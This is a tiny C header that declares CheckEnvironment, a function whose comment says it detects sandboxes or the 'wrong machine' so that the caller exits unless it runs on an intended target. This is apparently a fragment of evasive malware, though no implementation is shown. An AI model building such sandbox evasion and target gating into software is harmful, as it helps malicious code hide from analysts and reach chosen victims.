#pragma once
#include "common.h"

/* Returns TRUE if this is the intended target (or if checks are disabled).
   Returns FALSE if we're in a sandbox or wrong machine → caller should exit. */
BOOL CheckEnvironment(void);
